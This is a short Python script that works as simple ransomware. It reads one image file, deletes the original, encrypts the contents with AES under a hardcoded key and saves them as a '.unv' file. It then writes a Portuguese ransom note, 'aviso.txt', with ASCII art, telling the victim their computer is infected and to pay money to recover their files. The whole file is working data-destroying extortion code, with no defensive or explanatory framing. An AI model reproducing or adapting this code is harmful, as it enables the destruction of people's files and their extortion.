import os
import pyaes

# open file
file_name = 'é_noix.jpeg'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

# remove file
os.remove(file_name)

# crypt file data (using AES)
key = b'0123456789abcdef'  # chave fraca da porrakkkkkkkkk
aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = aes.encrypt(file_data)

# save file
new_file_name = file_name + '.unv'
new_file = open(new_file_name, 'wb')
new_file.write(crypto_data)
new_file.close()

# create txt
texto = b'sifudeu compiuter infectado otario\npague uma caralhada de dinheiro para recuperar os seus arquivos\n'
art = b'''                         ______                     
 _________        .---"""      """---.              
:______.-':      :  .--------------.  :             
| ______  |      | :                : |             
|:______B:|      | |  Little Error: | |             
|:______B:|      | |                | |             
|:______B:|      | |  Power not     | |             
|         |      | |  found.        | |             
|:_____:  |      | |                | |             
|    ==   |      | :                : |             
|       O |      :  '--------------'  :             
|       o |      :'---...______...---'              
|       o |-._.-i___/'             \._              
|'-.____o_|   '-.   '-...______...-'  `-._          
:_________:      `.____________________   `-.___.-. 
                 .'.eeeeeeeeeeeeeeeeee.'.      :___:
    fsc        .'.eeeeeeeeeeeeeeeeeeeeee.'.         
              :____________________________:'''
texto+=art
arquivo_texto = open('aviso.txt', 'wb')
arquivo_texto.write(texto)
arquivo_texto.close()